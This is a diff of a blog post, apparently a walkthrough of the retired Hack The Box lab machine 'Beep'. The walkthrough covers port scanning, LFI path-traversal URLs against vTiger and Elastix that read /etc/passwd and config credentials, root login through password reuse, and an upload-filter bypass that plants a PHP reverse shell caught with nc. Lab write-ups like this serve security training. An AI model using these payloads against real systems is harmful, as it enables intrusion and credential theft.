@@ -1,5 +1,7 @@
 ---
-title: "Walk-through of Beep from HTB"
+title: "Walk-through of Beep from HackTHeBox"
+header: 
+  teaser: /assets/images/2020-05-05-22-24-23.png
 toc: true
 toc_sticky: true
 excerpt_separator:  <!--more-->
@@ -11,23 +13,24 @@ tags:
   - smbclient
   - Metasploit
   - Linux
-
-published: false
 ---
 
 ## Machine Information
 
 ![Beep](/assets/images/2020-05-05-22-24-23.png)
 
-This was the fifth machine released on the [Hack The Box](https://www.hackthebox.eu/home) platform. It's now retired so only available to those with VIP membership here: [HTB - 005 - Easy - Beep](https://www.hackthebox.eu/home/machines/profile/5)
-
-Machine release date: 15th March 2017
-
-Date I completed it: 16th July 2019
-
-Distribution used: Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/)
+Beep has a large list of running services, which can make it a bit challenging to find the
+correct entry method. Skills Learned are web-based fuzzing, identifying known exploits and exploiting local file inclusion vulnerabilities.
 
 <!--more-->
+
+| Details |  |
+| --- | --- |
+| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
+| Link To Machine | [HTB - 005 - Easy - Beep](https://www.hackthebox.eu/home/machines/profile/5) |
+| Machine Release Date | 15th March 2017 |
+| Date I Completed It | 16th July 2019 |
+| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |
 
 ### Initial Recon
 
@@ -35,6 +38,7 @@ Check for open ports with Nmap:
 
 ```text
 root@kali:~/htb/beep# nmap -sS -sC -sV -oA beep -p- -T4 10.10.10.7
+
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-21 22:39 BST
 Nmap scan report for 10.10.10.7
 Host is up (0.039s latency).
@@ -82,7 +86,7 @@ Lots of ports open, start on normal path looking at port 80.
 
 ### Gaining Access
 
-Opening website at http://10.1010.7 on port 80 automatically redirects to port 443, try gobuster to find anything hidden:
+Opening website at http://10.10.10.7 on port 80 automatically redirects to port 443, try gobuster to find anything hidden:
 
 ```text
 root@kali:~/htb/beep# gobuster dir -k -u https://10.10.10.7 -w /usr/share/wordlists/dirb/big.txt
@@ -110,13 +114,13 @@ root@kali:~/htb/beep# searchsploit vtiger
 vTiger CRM 5.1.0 - Local File Inclusion  |  exploits/php/webapps/18770.txt
 ```
 
-Exploit shows how to use LFI to navigate to sub directories, use this in browser to get passwd list:
+Exploit shows how to use LFI to navigate to sub-directories, use this in browser to get passwd file:
 
 ```text
 https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
 ```
 
-Press ctrl-u to view source, shows as a proper list instead of jumble. 
+Press ctrl-u to view source, shows as a proper list instead of jumble.
 
 Copy and paste in to vi, remove all users with no login by doing:
 
@@ -133,7 +137,9 @@ asterisk
 fanis
 ```
 
-Box also has Elastix installed, which is also prone to LFI exploit:
+No obvious way forward with this, so save for possible brute force later and look for another path.
+
+Machine also has Elastix installed, which is prone to LFI exploit:
 
 ```text
 root@kali:~/htb/beep# searchsploit elastix
@@ -153,11 +159,11 @@ https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../
 
 This exposes the user **AMPortal**, with password **jEhdlekWmdjE**
 
-The box is vulnerable to password reuse, so it's possible to logon as root using this password:
+The machine is vulnerable to password reuse, so it's possible to logon as root using this password:
 
 ```text
 root@kali:~/htb/beep# ssh root@10.10.10.7
-root@10.10.10.7's password:   <---- enter jEhdlekWmdjE found above)
+root@10.10.10.7's password:   <---- enter jEhdlekWmdjE found above
 Last login: Tue Jul 16 11:45:47 2019
 Welcome to Elastix 
 ----------------------------------------------------
@@ -166,7 +172,7 @@ To access your Elastix System, using a separate workstation (PC/MAC/Linux)
 
 ### User and Root Flags
 
-Now have an ssh session on to the box, check who we are logged on as:
+Now have an ssh session on to the machine, check who we are logged on as:
 
 ```text
 whoami
@@ -176,8 +182,8 @@ root
 On as root user, so can get both flags:
 
 ```text
-cat /home/fanis/user.txt 
-cat /root/root.txt 
+cat /home/fanis/user.txt
+cat /root/root.txt
 ```
 
 ## Alternative Method
@@ -188,7 +194,7 @@ Log in to https://10.10.10.7/vtigercrm - user **admin**, password **jEhdlekWmdjE
 
 Navigate to Settings - Company Details
 
-There is a file upload vulnerability where you can upload a jpg but it doesn't properly sanitise. So you can have shell.php.jpg, then use [Tamper Data](https://addons.mozilla.org/en-GB/firefox/addon/tamper-data-for-ff-quantum/) to intercept request and remove double extension. Should then upload as a php. 
+There is a file upload vulnerability where you can upload a jpg but it doesn't properly sanitise. So you can have shell.php.jpg, then use [Tamper Data](https://addons.mozilla.org/en-GB/firefox/addon/tamper-data-for-ff-quantum/) or Burp to intercept request and remove double extension. Should then upload as a php.
 
 Have an nc -lvp 1234 waiting in a terminal and should get a reverse shell.
 
@@ -219,4 +225,4 @@ whoami
 root
 ```
 
-Can now get root flag.
+I can now get the user and root flags as above now.
